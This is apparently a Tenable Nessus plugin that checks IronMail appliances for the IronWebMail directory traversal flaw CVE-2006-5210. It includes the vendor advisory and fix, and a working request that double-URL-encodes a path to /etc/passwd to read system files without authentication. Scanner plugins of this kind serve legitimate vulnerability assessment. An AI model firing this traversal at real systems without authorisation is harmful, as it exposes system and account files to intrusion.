#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is prone to a directory traversal vulnerability. 

Description :

The remote host appears to be an IronMail appliance, which is intended
to protect enterprise-class email servers from spam, viruses, and
hackers. 

The webmail component of the remote IronMail device does not properly
validate pathname references included in a URL before using them to
return the contents of files on the remote host.  An unauthenticated
attacker can leverage this flaw to read arbitrary files and
directories on the remote host. 

See also :

http://www.securityfocus.com/advisories/11308
https://supportcenter.ciphertrust.com/vulnerability/IWM501-01.html

Solution :

Upgrade to Ironmail version 6.1.1 as necessary and install HotFix-17,
as described in the vendor advisory referenced above. 

Risk factor :

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";


if (description)
{
  script_id(22901);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-5210");
  script_bugtraq_id(20436);

  script_name(english:"IronWebMail Pathname Reference Directory Traversal Vulnerability");
  script_summary(english:"Tries to read a local file via IronWebMail");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Grab the initial page.
res = http_get_cache(item:"/", port:port);
if (res == NULL) exit(0);


# If it looks like IronWebMail...
if ("<title>IronMail IronWebMail Portal Login</title>" >< res)
{
  # Try to exploit the flaw to read a local file.
  file = "../../../../../../../../../../../../etc/passwd";
  exploit = urlencode(
    str        : file,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/"
  );
  exploit = urlencode(
    str        : exploit,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/"
  );
  req = http_get(
    item:string(
      dir, "/IM_FILE(", exploit, ")"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_note(port:port, data:report);
    exit(0);
  }
}

